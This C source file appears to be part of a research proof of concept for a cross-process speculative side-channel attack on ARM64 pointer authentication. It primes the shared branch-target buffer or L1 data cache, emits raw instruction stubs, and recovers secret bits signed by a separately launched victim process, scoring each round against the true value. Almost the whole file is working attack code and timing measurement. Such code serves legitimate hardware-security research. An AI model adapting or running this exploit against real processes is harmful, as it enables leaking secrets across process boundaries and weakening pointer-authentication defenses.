// xproc.c -- cross process (EL0 to EL0). The victim is a separate image, pac_victim, launched by fork and
// exec, sharing only the control page over an inherited memfd. It holds its own key and signs a fresh secret
// each round. Two media:
//   btb : the shared per-core branch-target buffer. The attacker seats co-set entries, each predicting its
//         own loader that touches its own marker line. The victim signs a pointer, applies the AND mask, and
//         speculatively branches to co-set sites, evicting primed entries. The attacker re-runs each entry
//         and reads whether its marker line survived.
//   l1d : the shared per-core L1 data cache. The victim runs the load gadget from a base the attacker names,
//         and the attacker primes and probes the congruent set.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include "channel.h"
#include "xpv.h"

// ===================== medium btb: shared-BTB prime and probe with the marker-line read-out =====================

#define COSET_STRIDE  (1UL << 13)              // co-set spacing (top BTB index bit = PC[12])
#define STUB_BYTES 64
#define MARKER_STRIDE         4096                     // marker-line stride: one page per attacker entry
#define SECRET_MASK (0x7fUL << 48)
#define RELOAD_LINES 8
#define KMAX  64
#define ARENA (256UL * 1024 * 1024)

typedef void (*branch_fn_t)(void);

static int btb_rootless = 0;

static inline uint64_t read_pmu_counter(void) { uint64_t v = 0; asm volatile("mrs %0,pmevcntr0_el0":"=r"(v)); return v; }
static inline uint64_t read_timer(void) {
    uint64_t t = 0;
    asm volatile("isb\n mrs %0,cntvct_el0\n isb" : "=r"(t) :: "memory");
    return t;
}
static inline void flush_cacheline(void *line) { asm volatile("dc civac,%0"::"r"(line):"memory"); }
static inline void memory_barrier(void) { asm volatile("dsb sy\n isb\n":::"memory"); }

static inline double entry_metric(volatile uint8_t *base) {
    if (btb_rootless) {
        memory_barrier();
        uint64_t t0 = read_timer();
        for (int j = 0; j < RELOAD_LINES; ++j) {
            uint8_t value = base[j * 64];
            asm volatile(""::"r"(value));
        }
        uint64_t t1 = read_timer();
        return (double)(t1 - t0);
    }
    memory_barrier();
    uint64_t before = read_pmu_counter();
    for (int j = 0; j < RELOAD_LINES; ++j) {
        uint8_t value = base[j * 64];
        asm volatile(""::"r"(value));
    }
    memory_barrier();
    return (double)(read_pmu_counter() - before);
}

// attacker probe stub: x16 = (slot0 & slot1) ^ slot2; blr x16. Architecturally branches to a benign page,
// speculatively runs the trained loader.
static void emit_probe_stub(void *at, uint64_t slots_base) {
    uint32_t *words = (uint32_t *)at;
    words[0]  = 0xF81F0FFEu;
    words[1]  = 0xD2800011u | (uint32_t)((slots_base & 0xffff) << 5);
    words[2]  = 0xF2A00011u | (uint32_t)(((slots_base >> 16) & 0xffff) << 5);
    words[3]  = 0xF2C00011u | (uint32_t)(((slots_base >> 32) & 0xffff) << 5);
    words[4]  = 0xF9400230u;
    words[5]  = 0xF9400629u;
    words[6]  = 0x8A090210u;
    words[7]  = 0xF9400A29u;
    words[8]  = 0xCA090210u;
    words[9]  = 0xD63F0200u;
    words[10] = 0xF84107FEu;
    words[11] = 0xD65F03C0u;
    __builtin___clear_cache((char *)at, (char *)at + STUB_BYTES);
}
static void emit_loader(void *at, uint64_t line) {
    uint32_t *words = (uint32_t *)at;
    words[0] = 0xD2800009u | (uint32_t)((line & 0xffff) << 5);
    words[1] = 0xF2A00009u | (uint32_t)(((line >> 16) & 0xffff) << 5);
    words[2] = 0xF2C00009u | (uint32_t)(((line >> 32) & 0xffff) << 5);
    for (int j = 0; j < RELOAD_LINES; ++j) {
        words[3 + j] = 0xF940012Au | (uint32_t)(((unsigned)j * 8u) << 10);
    }
    words[3 + RELOAD_LINES] = 0xD65F03C0u;
    __builtin___clear_cache((char *)at, (char *)at + 4 * (4 + RELOAD_LINES));
}

static long spec_flag[512] __attribute__((aligned(4096)));
static long spec_index[512] __attribute__((aligned(4096)));
static inline void speculative_probe(branch_fn_t branch_fn) {
    spec_flag[0] = 1;
    spec_index[0] = 0;
    flush_cacheline(&spec_index[0]);
    memory_barrier();
    long index = *(volatile long *)&spec_index[0];
    *(volatile long *)&spec_flag[index] = 0;
    if (0 != *(volatile long *)&spec_flag[0]) {
        branch_fn();
    }
}

static int num_entries = 24;
static int prime_passes = 8;

static uint8_t *arena;
static uint64_t probe_addr[KMAX];
static uint64_t loader_addr[KMAX];
static uint8_t *reload;
static uint64_t benign_target;
static uint64_t probe_slots[KMAX][4] __attribute__((aligned(64)));

static void prime_set(void) {
    for (int entry = 0; entry < num_entries; ++entry) {
        probe_slots[entry][0] = loader_addr[entry];
        probe_slots[entry][1] = ~(0xffffUL << 48);
        probe_slots[entry][2] = 0;
        probe_slots[entry][3] = 0;
    }
    for (int rep = 0; rep < prime_passes; ++rep) {
        for (int entry = 0; entry < num_entries; ++entry) {
            ((branch_fn_t)probe_addr[entry])();
        }
    }
}
static double probe_set(void) {
    for (int entry = 0; entry < num_entries; ++entry) {
        for (int j = 0; j < RELOAD_LINES; ++j) {
            flush_cacheline(&reload[entry * MARKER_STRIDE + j * 64]);
        }
    }
    memory_barrier();
    for (int entry = 0; entry < num_entries; ++entry) {
        probe_slots[entry][1] = ~(0xffffUL << 48);
        probe_slots[entry][2] = benign_target;
    }
    double metric = 0;
    for (int entry = num_entries - 1; entry >= 0; --entry) {
        speculative_probe((branch_fn_t)probe_addr[entry]);
        memory_barrier();
        metric += entry_metric(&reload[entry * MARKER_STRIDE]);
    }
    return metric;
}

static double one_shot(struct xpv_ctl *ctl, uint64_t and_mask, int skip) {
    ctl->and_mask = and_mask;
    ctl->skip = skip;
    prime_set();
    ctl->turn = 1;
    while (2 != ctl->turn) {
        sched_yield();
    }
    return probe_set();
}

// An all-zero field is canonical (accessed), the skipped victim is the never-evicted floor. Each bit keeps
// only its own field bit, so the secret bit alone decides whether the target stays canonical. The three
// shots are differenced per sample.
static unsigned measure_round(struct xpv_ctl *ctl, int samples) {
    unsigned rec = 0;
    for (int bit = 0; bit < SECRET_BITS; ++bit) {
        uint64_t keep = ~SECRET_MASK | (1UL << (48 + bit));
        double delta_to_accessed = 0;
        double delta_to_floor = 0;
        for (int trial = 0; trial < samples; ++trial) {
            double accessed = one_shot(ctl, ~SECRET_MASK, 0);
            double floor    = one_shot(ctl, ~SECRET_MASK, 1);
            double test     = one_shot(ctl, keep, 0);
            delta_to_accessed += test - accessed;
            delta_to_floor  += test - floor;
        }
        if ((delta_to_floor < 0 ? -delta_to_floor : delta_to_floor) < (delta_to_accessed < 0 ? -delta_to_accessed : delta_to_accessed)) {
            rec |= 1u << bit;
        }
    }
    return rec;
}

// ===================== shared launch: a separate victim image over an inherited memfd =====================

static struct xpv_ctl *ctl_map(int *out_fd) {
    int fd = memfd_create("xpv", 0);
    if (0 > fd) {
        perror("memfd_create");
        return NULL;
    }
    if (0 != ftruncate(fd, sizeof(struct xpv_ctl))) {
        perror("ftruncate");
        return NULL;
    }
    struct xpv_ctl *ctl = mmap(NULL, sizeof *ctl, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (MAP_FAILED == ctl) {
        perror("mmap control");
        return NULL;
    }
    memset(ctl, 0, sizeof *ctl);
    *out_fd = fd;
    return ctl;
}

static pid_t spawn_victim(int fd, int cpu) {
    if (0 != access("./pac_victim", X_OK)) {
        fprintf(stderr, "./pac_victim not found or not executable (run make)\n");
        return -1;
    }
    pid_t pid = fork();
    if (0 > pid) {
        perror("fork");
        return -1;
    }
    if (0 == pid) {
        char cpu_s[16];
        char fd_s[16];
        snprintf(cpu_s, sizeof cpu_s, "%d", cpu);
        snprintf(fd_s, sizeof fd_s, "%d", fd);
        execl("./pac_victim", "pac_victim", cpu_s, fd_s, (char *)NULL);
        perror("execl ./pac_victim");
        _exit(127);
    }
    return pid;
}

static int run_xproc_btb(const struct cfg *cfg, struct chan_stats *out) {
    int rounds = cfg->rounds;
    int samples = cfg->samples;
    btb_rootless = (T_CNTVCT == cfg->tmr);
    pin_to_core(cfg->cpu);
    enable_store_bypass();
    if (!btb_rootless) {
        pmu_init(M_L1D);
    }

    arena = mmap(NULL, ARENA, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (MAP_FAILED == arena) {
        perror("mmap arena");
        return 1;
    }
    reload = mmap(NULL, (size_t)KMAX * MARKER_STRIDE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (MAP_FAILED == reload) {
        perror("mmap reload");
        return 1;
    }
    for (int entry = 0; entry < KMAX; ++entry) {
        for (int j = 0; j < RELOAD_LINES; ++j) {
            reload[entry * MARKER_STRIDE + j * 64] = 1;
        }
    }
    *(uint32_t *)arena = 0xD65F03C0u;
    __builtin___clear_cache((char *)arena, (char *)arena + 4);
    benign_target = (uint64_t)arena;

    uint64_t probe_base = (uint64_t)arena + 0x1000000;
    for (int entry = 0; entry < KMAX; ++entry) {
        probe_addr[entry] = probe_base + (uint64_t)entry * COSET_STRIDE;
        emit_probe_stub((void *)probe_addr[entry], (uint64_t)probe_slots[entry]);
    }
    uint64_t loader_base = (uint64_t)arena + 0x100000;
    for (int entry = 0; entry < KMAX; ++entry) {
        loader_addr[entry] = loader_base + (uint64_t)entry * 64;
        emit_loader((void *)loader_addr[entry], (uint64_t)&reload[entry * MARKER_STRIDE]);
    }

    int fd = -1;
    struct xpv_ctl *ctl = ctl_map(&fd);
    if (NULL == ctl) {
        return 1;
    }
    ctl->mode = XPV_BTB;
    ctl->control = cfg->control;
    ctl->nvbranch = XPV_VBRANCHES;
    for (int j = 0; j < XPV_VBRANCHES; ++j) {
        ctl->victim_va[j] = probe_base + (uint64_t)(KMAX + j) * COSET_STRIDE;   // co-set with the probes
    }
    ctl->round = -1;
    ctl->ack = -1;
    pid_t pid = spawn_victim(fd, cfg->cpu);
    if (0 > pid) {
        return 1;
    }
    ctl->params_ready = 1;

    struct chan_stats stats = { .rounds = rounds, .bits_total = (long)rounds * SECRET_BITS };
    struct timespec start = { 0 };
    struct timespec end = { 0 };
    clock_gettime(CLOCK_MONOTONIC, &start);
    for (int round = 0; round < rounds; ++round) {
        ctl->round = round;
        while (round != ctl->ack) {
            sched_yield();
        }
        unsigned rec = measure_round(ctl, samples);
        ctl->reveal_req = 1;
        while (1 != ctl->reveal_ack) {
            sched_yield();
        }
        unsigned truth = ctl->truth;
        int hit = (truth == rec);
        stats.full += hit;
        stats.bits_correct += bits_match(rec, truth, SECRET_BITS);
        tee_printf("  %3d  | secret=0x%02x  recovered=0x%02x  %d/7  %s\n",
                   round, truth, rec, bits_match(rec, truth, SECRET_BITS), hit ? "WIN" : "lose");
    }
    clock_gettime(CLOCK_MONOTONIC, &end);
    stats.seconds = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;

    ctl->done = 1;
    ctl->turn = 1;
    waitpid(pid, NULL, 0);
    *out = stats;
    return 0;
}

// ===================== medium l1d: separate victim image runs the load gadget from a named base =====================

#define L1D_BASE_VA 0x4500000000UL

static void l1d_next_round(void *c) {
    struct xpv_ctl *ctl = c;
    int round = ctl->round + 1;
    ctl->round = round;
    while (ctl->ready != round) {
        sched_yield();
    }
}
static void l1d_set_bit(void *c, int bit) { ((struct xpv_ctl *)c)->bit = bit; }
static void l1d_set_mode(void *c, int mode) { ((struct xpv_ctl *)c)->sel = mode; }
static void l1d_transmit(void *c) {
    struct xpv_ctl *ctl = c;
    ctl->turn = 1;
    while (2 != ctl->turn) {
        sched_yield();
    }
}
static unsigned l1d_reveal(void *c) {
    struct xpv_ctl *ctl = c;
    int req = ctl->reveal_req + 1;
    ctl->reveal_req = req;
    while (ctl->reveal_ack != req) {
        sched_yield();
    }
    return ctl->truth;
}

static int run_xproc_l1d(const struct cfg *cfg, struct chan_stats *out) {
    pin_to_core(cfg->cpu);
    struct attacker att = { 0 };
    attacker_setup(&att, cfg->med, cfg->tmr, L1D_BASE_VA);

    int fd = -1;
    struct xpv_ctl *ctl = ctl_map(&fd);
    if (NULL == ctl) {
        return 1;
    }
    ctl->mode = XPV_L1D;
    ctl->sw = (int)cfg->sw;
    ctl->med = (int)cfg->med;
    ctl->control = cfg->control;
    ctl->base_va = L1D_BASE_VA;
    ctl->turn = 2;
    ctl->round = -1;
    ctl->ready = -1;
    ctl->sel = -1;
    pid_t pid = spawn_victim(fd, cfg->cpu);
    if (0 > pid) {
        return 1;
    }
    ctl->params_ready = 1;

    struct victim_io io = {
        .ctx = ctl, .next_round = l1d_next_round, .set_bit = l1d_set_bit,
        .set_mode = l1d_set_mode, .transmit = l1d_transmit, .reveal = l1d_reveal,
    };
    recover_rounds(&att, &io, cfg, out);

    ctl->done = 1;
    ctl->turn = 1;
    waitpid(pid, NULL, 0);
    return 0;
}

int run_xproc(const struct cfg *cfg, struct chan_stats *out) {
    if (M_BTB == cfg->med) {
        return run_xproc_btb(cfg, out);
    }
    return run_xproc_l1d(cfg, out);
}
